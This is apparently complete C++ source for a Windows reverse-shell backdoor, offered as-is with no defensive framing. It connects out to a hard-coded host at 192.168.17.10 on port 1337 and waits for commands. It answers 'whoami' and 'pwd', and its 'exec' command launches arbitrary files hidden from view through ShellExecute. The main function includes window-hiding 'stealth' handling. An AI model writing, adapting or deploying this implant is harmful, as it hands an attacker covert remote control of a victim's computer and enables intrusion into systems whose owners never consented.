//C++ Headers

#include <winsock2.h>       //Socket Header
#include <windows.h>        //Win API Header
#include <ws2tcpip.h>       //TCP-IP Header
//C Header
#include <stdio.h>          //Input Output Header

//Debug C++ Header
#include <iostream>     //Input Output Debug Header

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void whoami(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetUserName(returnval, &returnsize);
}

void hostname(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize) //Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

void exec(char* returnval, int returnsize, char *fileexec)
{
    std::cout << fileexec << std::endl;
    if (32 >= (int)(ShellExecute(NULL,"open", fileexec, NULL, NULL, SW_HIDE))) //Get return value in int
    {
        strcat(returnval, "[x] Error executing command..\n");
    }
    else
    {
        strcat(returnval, "\n");
    }
}

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.17.10");
    addr.sin_port = htons(1337);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected. Waiting for client to input command..." << std::endl;

        char CommandReceived[DEFAULT_BUFLEN] = "";
        while(true)
        {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            std::cout << "Command received: " << CommandReceived;
            std::cout << "Length of Command received: " << Result << std::endl;
            
            if ((strcmp(CommandReceived, "whoami\n") == 0)) 
            {
                std::cout << "Command parsed: whoami" << std::endl;

                char buffer[257] = "";
                whoami(buffer, 257);
                strcat(buffer, "\n");

                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "pwd\n") == 0)) 
            {
                std::cout << "Command parsed: pwd" << std::endl;
                char buffer[257] = "";
                pwd(buffer,257);
                strcat(buffer, "\n");

                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "exit\n") == 0)) 
            {
                std::cout << "Command parsed: exit" << std::endl;
                std::cout << "Closing Connection... Goodbye!" << std::endl;
                // Execute gracefully

                closesocket(tcpsock);
                WSACleanup();
                exit(0);

            }
            else
            {

                char splitval[DEFAULT_BUFLEN] = "";
                for(int i=0; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                {
                    if (CommandReceived[i] == *" ")    //CommandReceived[i] is a pointer here and can only be compared with a integer, this *" "
                    {
                        break;
                    }
                    else
                    {
                        splitval[i] = CommandReceived[i];
                    }
                }

                if ((strcmp(splitval, "exec") == 0)) {
                    char CommandExec[DEFAULT_BUFLEN] = "";
                    int j = 0;
                    for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                    {
                        CommandExec[j] = CommandReceived[i];
                        ++j;
                    }
                    char buffer[257] = "";
                    exec(buffer, 257, CommandExec);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else {
                    char buffer[20] = "Invalid Command\n";
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
            }
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

//Main function

int main()
{
    HWND stealth;           //Declare a window handle 
    AllocConsole();     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,SW_SHOWNORMAL);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}

